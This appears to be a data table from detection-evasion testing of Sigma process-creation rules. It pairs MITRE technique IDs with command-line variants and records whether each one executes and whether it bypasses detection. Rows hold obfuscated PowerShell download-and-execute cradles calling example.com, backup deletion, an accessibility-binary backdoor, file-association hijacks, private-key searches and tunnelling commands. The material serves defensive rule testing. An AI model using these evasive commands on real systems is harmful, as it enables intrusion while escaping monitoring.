Technical	Rule_name	Title	Rule_id	Command_match_rule	Commandline_evasion	Excutable	Bypass target rule	Bypass all rule	Trigger rule
t1218.011	proc_creation_win_rundll32_uncommon_dll_extension	Rundll32 Execution With Uncommon DLL Extension	c3a99af4-35a9-4668-879e-c09aeb4f2bdf		"""C:\WINDOWS\system32\rundll32.exe"" -sta AtomicTest"	FALSE	FALSE	FALSE	
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""I`e`x (New-Object Net.WebClient).D`o`wnloadString('http://example.com/payload')"""	TRUE	TRUE	FALSE	Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Powershell Token Obfuscation - Process Creation (deb9b646-a508-44ee-b7c9-d8965921c6b6); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""IEX(New-Object Net.WebClient).DownloadData('http://example.com/payload')"""	TRUE	TRUE	FALSE	Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Suspicious PowerShell Invocations - Specific - ProcessCreation (536e2947-3729-478c-9903-745aaffe60d2); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1218.011	proc_creation_win_susp_powershell_execution_via_dll	Potential PowerShell Execution Via DLL	6812a10b-60ea-420c-832f-dfcc33b646ba		"rundll32.exe PowerShdll.dll,main -c ""Invoke-RestMethod -Uri http://example.com/payload | IEX"""	TRUE	TRUE	FALSE	PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); PowerShell Download and Execution Cradles (85b0b087-eddf-4a2b-b033-d771fa2b9775); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Suspicious PowerShell IEX Execution Patterns (09576804-7a05-458e-a817-eb718ca91f54); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d); Usage Of Web Request Commands And Cmdlets (9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d)
t1090.001	proc_creation_win_cloudflared_quicktunnel_execution	Cloudflared Quick Tunnel Execution	222129f7-f4dc-4568-b0d2-22440a9639ba		"""cloudflared.exe"" --url http://example.com"	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_pua_chisel	PUA - Chisel Tunneling Tool Execution	8b0e12da-d3c3-49db-bb4f-256703f380e5		chisel.exe client 10.0.0.5:8080	FALSE	FALSE	FALSE	
t1090.001	proc_creation_win_renamed_cloudflared	Renamed Cloudflared.EXE Execution	e0c69ebd-b54f-4aed-8ae3-e3467843f3f0		"""cloudflared.exe"" tunnel run --config C:\temp\myconfig.yml --token abcdef123456"	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared tunnel cleanup --config C:\temp\config.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared tunnel cleanup --connector-id ABC123	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		"cloudflared tunnel cleanup --connector-id=""ABC-123-DEF"""	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		"cloudflared.exe ""tunnel"" ""cleanup"" -config C:\Windows\Temp\config.yml"	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		"cloudflared.exe -config C:\tunnel.yml ""tunnel"" ""cleanup"""	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe -config C:\tunnel.yml tunnel cleanup	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup --config C:\tunnel.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup -config=C:\tunnel.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup -config=C:\Windows\Temp\config.yml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel --config=C:\temp\config.yaml cleanup-connections	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		cloudflared.exe tunnel cleanup --connector-id=12345	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_cleanup	Cloudflared Tunnel Connections Cleanup	7050bba1-1aed-454e-8f73-3f46f09ce56a		copy cloudflared.exe cf.exe && cf.exe tunnel cleanup --config C:\config.yaml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		"cloudflared.exe ""tunnel"" ""run"" --credentials-file cert.json"	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		"cloudflared.exe ""tunnel"" ""run"" --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		cloudflared.exe --token eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9... tunnel run	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		cloudflared.exe tunnel run --token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		"cmd.exe /c ""set TUNNEL_TOKEN=eyJhbGci... && cloudflared.exe tunnel run"""	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		cloudflared.exe ^t^u^n^n^e^l ^r^u^n --token eyJhIjoi...n0=	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		copy cloudflared.exe cf.exe && cf.exe --token=eyJhIjoi...n0= tunnel run	FALSE	FALSE	FALSE	
t1102	proc_creation_win_cloudflared_tunnel_run	Cloudflared Tunnel Execution	9a019ffc-3580-4c9d-8d87-079f7e8d3fd4		set A=tunnel&& set B=run&& cloudflared.exe %A% %B% --token eyJhbGciOiJIUzI1NiJ9.fake	FALSE	FALSE	FALSE	
t1102	proc_creation_win_java_manageengine_susp_child_process	Suspicious Child Process Of Manage Engine ServiceDesk	cea2b7ea-792b-405f-95a1-b903ea06458f		cmd.exe /c powershell.exe -nop -ep bypass	TRUE	TRUE	FALSE	Suspicious PowerShell Parameter Substring (36210e0d-5b19-485d-a087-c096088885f0); Change PowerShell Policies to an Insecure Level (87e3c4e8-a6a8-4ad9-bb4f-46e7ff99a180); Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1102	proc_creation_win_java_manageengine_susp_child_process	Suspicious Child Process Of Manage Engine ServiceDesk	cea2b7ea-792b-405f-95a1-b903ea06458f		MSBuild.exe C:\path\to\malicious.xml	FALSE	FALSE	FALSE	
t1102	proc_creation_win_java_manageengine_susp_child_process	Suspicious Child Process Of Manage Engine ServiceDesk	cea2b7ea-792b-405f-95a1-b903ea06458f		"rundll32.exe javascript:""\..\mshtml,RunHTMLApplication "";document.write();"	TRUE	TRUE	FALSE	Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Mshtml.DLL RunHTMLApplication Suspicious Usage (4782eb5a-a513-4523-a0ac-f3082b26ac5c); Rundll32 Execution With Uncommon DLL Extension (c3a99af4-35a9-4668-879e-c09aeb4f2bdf)
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061	"""cmd.exe"" /c assoc .hta=txtfile"	"""cmd.exe"" /c assoc .hta=txtfile"	TRUE	FALSE	FALSE	Change Default File Association Via Assoc (3d3aa6cd-6272-44d6-8afc-7e88dfef7061)
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		cmd  /c assoc	FALSE	FALSE	FALSE	
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		copy cmd.exe not_cmd.exe && not_cmd.exe /c assoc .txt=exefile	FALSE	FALSE	FALSE	
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		"powershell.exe -Command ""Start-Process 'cmd.exe' -ArgumentList '/c "", [char]97+[char]115+[char]115+[char]111+[char]99, "" .txt=txtfile'"""	TRUE	TRUE	FALSE	Non Interactive PowerShell Process Spawned (f4bbd493-b796-416e-bbf2-121235348529)
t1546.001	proc_creation_win_cmd_assoc_execution	Change Default File Association Via Assoc	3d3aa6cd-6272-44d6-8afc-7e88dfef7061		"reg add ""HKEY_CLASSES_ROOT\.txt"" /t REG_SZ /d ""exefile"" /f"	TRUE	TRUE	TRUE	
t1546.001	proc_creation_win_cmd_assoc_tamper_exe_file_association	Change Default File Association To Executable Via Assoc	ae6f14e6-14de-45b0-9f44-c0986f50dc89	"cmd.exe /c ""assoc .txt=exefile"""	assoc .txt=exefile	TRUE	FALSE	FALSE	Change Default File Association To Executable Via Assoc (ae6f14e6-14de-45b0-9f44-c0986f50dc89); Change Default File Association Via Assoc (3d3aa6cd-6272-44d6-8afc-7e88dfef7061)
t1546.001	proc_creation_win_cmd_assoc_tamper_exe_file_association	Change Default File Association To Executable Via Assoc	ae6f14e6-14de-45b0-9f44-c0986f50dc89		"cmd.exe /c ""assoc.exe .jpg=exefile"""	TRUE	TRUE	FALSE	Change Default File Association Via Assoc (3d3aa6cd-6272-44d6-8afc-7e88dfef7061)
t1546.001	proc_creation_win_cmd_assoc_tamper_exe_file_association	Change Default File Association To Executable Via Assoc	ae6f14e6-14de-45b0-9f44-c0986f50dc89		"reg add ""HKEY_CLASSES_ROOT\.txt"" /t REG_SZ /d ""exefile"" /f"	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		"""cmd.exe"" /c del /f %%temp%%\deleteme_T1551.004"	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		"""cmd.exe"" /c del %%TEMP%%\PrintBrm.zip >nul 2>&1  & C:\Windows\System32\spool\tools\PrintBrm.exe -b -d \\127.0.0.1\c$\AtomicRedTeam\atomics\T1105\src\  -f %%TEMP%%\PrintBrm.zip -O FORCE"	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3	"""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd"	"""cmd.exe"" /c pushd \\localhost\C$ & echo var fileObject = WScript.createobject(""Scripting.FileSystemObject"");var newfile = fileObject.CreateTextFile(""AtomicTestFileT1105.js"", true);newfile.WriteLine(""This is an atomic red team test file for T1105. It simulates how OSTap worms accross network shares and drives."");newfile.Close(); > AtomicTestT1105.js & CScript.exe AtomicTestT1105.js //E:JScript & del AtomicTestT1105.js /Q >nul 2>&1 & del AtomicTestFileT1105.js /Q >nul 2>&1 & popd"	TRUE	FALSE	FALSE	File Deletion Via Del (379fa130-190e-4c3f-b7bc-6c8e834485f3)
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		"""cmd.exe"" /c del /s /f /q c:\*.VHD c:\*.bac c:\*.bak c:\*.wbcat c:\*.bkf c:\Backup*.* c:\backup*.* c:\*.set c:\*.win c:\*.dsk"	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		"""cmd.exe"" /c IF NOT EXIST %%windir%%\System32\osk.exe.bak (copy %%windir%%\System32\osk.exe %%windir%%\System32\osk.exe.bak) ELSE ( pushd ) & takeown /F %%windir%%\System32\osk.exe /A & icacls %%windir%%\System32\osk.exe /grant Administrators:F /t & del %%windir%%\System32\osk.exe & mklink %%windir%%\System32\osk.exe %%windir%%\System32\cmd.exe"	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_del_execution	File Deletion Via Del	379fa130-190e-4c3f-b7bc-6c8e834485f3		cmd.exe /c del %TEMP%\*.tmp	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_greedy_deletion	Greedy File Deletion Using Del	204b17ae-4007-471b-917b-b917b315c5db		"cmd.exe /c ""cd C:\ProgramData && del *.dll"""	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_greedy_deletion	Greedy File Deletion Using Del	204b17ae-4007-471b-917b-b917b315c5db		"cmd.exe /c ""d^e^l *.dll"""	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_del_greedy_deletion	Greedy File Deletion Using Del	204b17ae-4007-471b-917b-b917b315c5db		"cmd.exe /c ""set x=del && %x% *.dll"""	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_ping_copy_combined_execution	Potentially Suspicious Ping/Copy Command Combination	ded2b07a-d12f-4284-9b76-653e37b6c8b0		"cmd.exe /c ""ping -n 1 127.0.0.1 && copy C:\Windows\System32\drivers\etc\hosts C:\Temp\hosts.bak"""	TRUE	TRUE	FALSE	Suspicious Copy From or To System Directory (fff9d2b7-e11c-4a69-93d3-40ef66189767)
t1070.004	proc_creation_win_cmd_ping_del_combined_execution	Suspicious Ping/Del Command Combination	54786ddc-5b8a-11ed-9b6a-0242ac120002		ping 127.0.0.1 -n 5 > NUL && del lockbit.exe	TRUE	TRUE	TRUE	
t1070.004	proc_creation_win_cmd_rmdir_execution	Directory Removal Via Rmdir	41ca393d-538c-408a-ac27-cf1e038be80c		"""cmd.exe"" /c rmdir /s /q %%temp%%\deleteme_T1551.004"	FALSE	FALSE	FALSE	
t1070.004	proc_creation_win_cmd_rmdir_execution	Directory Removal Via Rmdir	41ca393d-538c-408a-ac27-cf1e038be80c		cmd.exe /c rd /s /q C:\temp\malicious_folder	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"""cmd.exe"" /c mkdir c:\exfil & diskshadow.exe /s C:\AtomicRedTeam\atomics\T1003.003\src\diskshadow.txt"	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"""cmd.exe"" /c rmdir /s /q %%temp%%\deleteme_T1551.004"	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"""cmd.exe"" /c dir /s c:\ >> %%temp%%\T1083Test1.txt & dir /s ""c:\Documents and Settings"" >> %%temp%%\T1083Test1.txt & dir /s ""c:\Program Files\"" >> %%temp%%\T1083Test1.txt & dir ""%%systemdrive%%\Users\*.*"" >> %%temp%%\T1083Test1.txt & dir ""%%userprofile%%\AppData\Roaming\Microsoft\Windows\Recent\*.*"" >> %%temp%%\T1083Test1.txt & dir ""%%userprofile%%\Desktop\*.*"" >> %%temp%%\T1083Test1.txt & tree /F >> %%temp%%\T1083Test1.txt"	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006	"""cmd.exe"" /c mkdir ""c:\Temp"" & cd C:\AtomicRedTeam\atomics\T1105\bin\ & GUP.exe -unzipTo """" ""C:\Temp"" ""Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"""	"""cmd.exe"" /c mkdir ""c:\Temp"" & cd C:\AtomicRedTeam\atomics\T1105\bin\ & GUP.exe -unzipTo """" ""C:\Temp"" ""Sample https://getsamplefiles.com/download/zip/sample-2.zip CAC4D26F32CA629DFB10FE614ED00EB1066A0C0011386290D3426C3DE2E53AC6"""	TRUE	FALSE	FALSE	File Download Using Notepad++ GUP Utility (44143844-0631-49ab-97a0-96387d6b2d7c); Suspicious GUP Usage (0a4f6091-223b-41f6-8743-f322ec84930b); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"""cmd.exe"" /c mkdir %%temp%%\T1119_command_prompt_collection >nul 2>&1 & dir c: /b /s .docx | findstr /e .docx & for /R c:\ %%f in (*.docx) do copy /Y %%f %%temp%%\T1119_command_prompt_collection"	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006	"C:\WINDOWS\system32\cmd.exe  /S /D /c"" dir c: /b /s .docx """	"C:\WINDOWS\system32\cmd.exe  /S /D /c"" dir c: /b /s .docx """	TRUE	FALSE	FALSE	Automated Collection Command Prompt (f576a613-2392-4067-9d1a-9345fb58d8d1); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006	"""cmd.exe"" /c mkdir ""%%%%TEMP%%%%\art-expand-out"" >nul 2>&1 & echo hello from atomic red team > ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" & makecab ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""%%%%TEMP%%%%\art-expand-test.cab"" & pushd ""%%%%TEMP%%%%\art-expand-out"" & expand ""%%%%TEMP%%%%\art-expand-test.cab"" -F:* . & popd"	"""cmd.exe"" /c mkdir ""%%TEMP%%\art-expand-out"" >nul 2>&1 & echo hello from atomic red team > ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" & makecab ""C:\AtomicRedTeam\atomics\T1140\src\art-expand-source.txt"" ""%%TEMP%%\art-expand-test.cab"" & pushd ""%%TEMP%%\art-expand-out"" & expand ""%%TEMP%%\art-expand-test.cab"" -F:* . & popd"	TRUE	FALSE	FALSE	File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"""cmd.exe"" /c dir /s /b %%USERPROFILE%%\Favorites"	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006	"""cmd.exe"" /c dir c:\ /b /s .key | findstr /e .key"	"""cmd.exe"" /c dir c:\ /b /s .key | findstr /e .key"	TRUE	FALSE	FALSE	Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); Private Keys Reconnaissance Via CommandLine Tools (213d6a77-3d55-4ce8-ba74-fcfef741974e); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006		"C:\WINDOWS\system32\cmd.exe  /S /D /c"" dir c:\ /b /s .key """	FALSE	FALSE	FALSE	
t1217	proc_creation_win_cmd_dir_execution	File And SubFolder Enumeration Via Dir Command	7c9340a9-e2ee-4e43-94c5-c54ebbea1006	"""cmd.exe"" /c path=%%%%path%%%%;""C:\Program Files (x86)\winzip"" & mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%%%ProgramFiles%%%%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * & dir"	"""cmd.exe"" /c path=%%path%%;""C:\Program Files (x86)\winzip"" & mkdir .\tmp\victim-files & cd .\tmp\victim-files & echo ""This file will be encrypted"" > .\encrypted_file.txt & ""%%ProgramFiles%%\WinZip\winzip64.exe"" -min -a -s""hello"" archive.zip * & dir"	TRUE	FALSE	FALSE	Compress Data and Lock With Password for Exfiltration With WINZIP (e2e80da2-8c66-4e00-ae3c-2eebd29f6b6d); File And SubFolder Enumeration Via Dir Command (7c9340a9-e2ee-4e43-94c5-c54ebbea1006)
t1217	proc_creation_win_where_browser_data_recon	Suspicious Where Execution	725a9768-0f5e-4cb3-aec2-bc5719c6831a	where   /R C:\Users\ Bookmarks	where  /R C:\Users\ Bookmarks	TRUE	FALSE	FALSE	Suspicious Where Execution (725a9768-0f5e-4cb3-aec2-bc5719c6831a)
t1217	proc_creation_win_where_browser_data_recon	Suspicious Where Execution	725a9768-0f5e-4cb3-aec2-bc5719c6831a	where   /R C:\Users\ places.sqlite	where  /R C:\Users\ places.sqlite	TRUE	FALSE	FALSE	Suspicious Where Execution (725a9768-0f5e-4cb3-aec2-bc5719c6831a)
t1059	proc_creation_win_cmd_dosfuscation	Potential Dosfuscation Activity	a77c1610-fc73-4019-8e29-0f51efc04a51		"cmd /c ""set X=m& set Y=d& c%X%%Y% /c calc.exe"""	FALSE	FALSE	FALSE	
t1059	proc_creation_win_cmd_dosfuscation	Potential Dosfuscation Activity	a77c1610-fc73-4019-8e29-0f51efc04a51		"cmd.exe /c ""FOR /F ""tokens=1"" %A IN ('echo set') DO %A MYVAR=value"""	TRUE	TRUE	TRUE	
t1059	proc_creation_win_cmd_dosfuscation	Potential Dosfuscation Activity	a77c1610-fc73-4019-8e29-0f51efc04a51		"cmd.exe /c ""s""e""t OBJ=calc.exe && %O%B%J%"""	FALSE	FALSE	FALSE	
t1059	proc_creation_win_forfiles_proxy_execution_	Forfiles Command Execution	9aa5106d-bce3-4b13-86df-3a20f1d5cf0b	forfiles   /p c:\windows\system32 /m notepad.exe /c calc.exe	forfiles  /p c:\windows\system32 /m notepad.exe /c calc.exe	TRUE	FALSE	FALSE	Forfiles Command Execution (9aa5106d-bce3-4b13-86df-3a20f1d5cf0b)
t1059	proc_creation_win_forfiles_proxy_execution_	Forfiles Command Execution	9aa5106d-bce3-4b13-86df-3a20f1d5cf0b		"copy forfiles.exe not_forfiles.exe && not_forfiles.exe /p c:\windows\system32 /m notepad.exe /c ""calc.exe"""	FALSE	FALSE	FALSE	
